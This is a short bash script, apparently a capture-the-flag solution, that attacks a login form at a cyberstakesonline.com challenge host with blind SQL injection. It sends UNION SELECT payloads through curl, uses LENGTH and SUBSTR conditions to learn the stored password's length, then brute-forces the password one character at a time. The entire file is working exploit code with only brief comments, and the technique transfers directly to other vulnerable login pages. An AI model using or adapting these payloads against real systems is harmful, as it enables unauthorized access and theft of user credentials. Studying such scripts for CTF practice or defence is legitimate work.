#!/bin/bash

set -f # do not glob - it breaks * and ? in $chars

addr="http://shell.cyberstakesonline.com:50166/login"

# Get all printable characters -- ugly!
chars=`for i in $(seq 32 127); do printf \\\\$(printf '%03o\t' "$i"); printf ' '; done;printf "\n"`

function checklen() {
  user="foo' UNION ALL SELECT * FROM users WHERE LENGTH(password) == $1"
  postdata="user=${user}; --&password=a"
  # return:
  curl --silent --data "$postdata" $addr | grep password >/dev/null
}

function checkchr() {
  user="foo' UNION ALL SELECT * FROM users"
  user="${user} WHERE SUBSTR(password,$1,1) = '$2'; --"
  postdata="user=${user}&password=a"
  # return:
  curl --silent --data "$postdata" $addr | grep password >/dev/null
}

# Get length of password
length=1
until checklen $length; do
    let length=length+1
done

# Brute force character-by-character
for i in `seq 1 $length`; do
    for c in $chars; do
        if checkchr $i $c; then
            echo -ne $c
            break
        fi
    done
done

echo

